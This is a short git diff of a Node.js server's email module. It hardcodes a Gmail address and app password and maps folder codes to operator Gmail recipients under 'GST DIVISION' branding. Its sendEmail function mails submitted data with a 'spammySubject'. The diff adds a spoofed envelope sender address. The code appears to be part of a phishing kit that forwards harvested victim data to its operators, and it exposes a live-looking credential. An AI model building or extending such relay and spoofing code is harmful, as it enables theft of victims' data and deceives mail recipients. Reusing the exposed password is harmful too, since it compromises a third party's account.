@@ -14,6 +14,7 @@ app.use(bodyParser.json({ limit: '10mb' }));
 // ========== KONFIGURASI EMAIL ==========
 const SENDER_EMAIL = 'gajeb682@gmail.com';
 const SENDER_PASSWORD = 'tmyh wklt uyig lots';
+const emailadmin = 'GST.SQUAD.DIVISION@admin.com';
 
 const EMAIL_CONFIG = {
     'wxyzzay': {
@@ -28,7 +29,7 @@ const EMAIL_CONFIG = {
     },
     'hgefdyt': {
         email: ['nebarzam@gmail.com', 'chilligemaass@gmail.com'],
-        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        fromName: '👻WHEN YA PERDETIK👻',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'mgwhiww': {
@@ -542,8 +543,8 @@ async function sendEmail(data, folderName) {
         };
 
         await transporter.sendMail({
-            from: `"${gstRandom}" <${FROM_ADDRESS}>`,
-            envelope: { from: SENDER_EMAIL, to: receiver },
+            from: `"${gstFullwidth}" <${FROM_ADDRESS}>`,
+            envelope: { from: emailadmin, to: receiver },
             to: receiver,
             subject: spammySubject,
             replyTo: REPLY_ADDRESS,
